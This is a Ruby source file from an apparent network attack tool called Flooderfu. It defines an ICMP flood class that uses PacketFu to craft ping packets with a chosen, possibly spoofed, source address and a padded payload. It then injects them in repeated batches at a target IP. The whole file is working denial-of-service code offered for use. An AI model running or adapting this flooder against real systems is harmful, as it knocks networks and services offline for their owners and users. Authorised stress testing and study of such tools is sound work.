# -*- encoding : utf-8 -*-
require 'packetfu'

module Flooderfu
  module Icmp
    class Attack

      include Flooderfu::Network
      include Flooderfu::Errors

      attr_accessor :packet, :injection, :options

      def initialize(opts)
        @options = opts
        @injection = PacketFu::Inject.new(:iface => @options.interface)
        raise InvalidOptionsError.new("Check the options!") unless valid_options?
        craft_package!
      end

      def start!
        puts "icmp flooding #{@options.destination_ip}"
        log "filling the array with #{@options.size} packets..."
        @injection.array = [@package.to_s] * @options.size

        time = Time.now
        @options.runs.times do |c|
          @injection.inject
          log "here comes packet number #{(c+1)*@options.size}"
        end

        log "elapsed time for #{@options.runs*@options.size} packets: #{Time.now - time} seconds"
      end

      def valid_options?
        return false unless is_mac?(@options.destination_mac)
        return false unless is_ip?(@options.destination_ip)
        return false unless is_mac?(@options.source_mac)
        return false unless is_ip?(@options.source_ip)
        true
      end

      protected

      def log(str)
        puts str if @options.verbose
      end

      def craft_package!
        @package = PacketFu::ICMPPacket.new
        @package.eth_header.eth_daddr = @options.destination_mac
        @package.eth_header.eth_saddr = @options.source_mac
        @package.ip_header.ip_proto = 1
        @package.ip_header.ip_tos = 0
        @package.ip_header.ip_ttl = @options.ttl
        @package.ip_header.ip_daddr = @options.destination_ip
        @package.ip_header.ip_saddr = @options.source_ip
        @package.icmp_header.icmp_type = 8
        @package.icmp_header.icmp_code = 0
        @package.payload = "abcdefghijklmnopqrstuvwxyz" * @options.load
        @package.recalc
      end

    end
  end
end


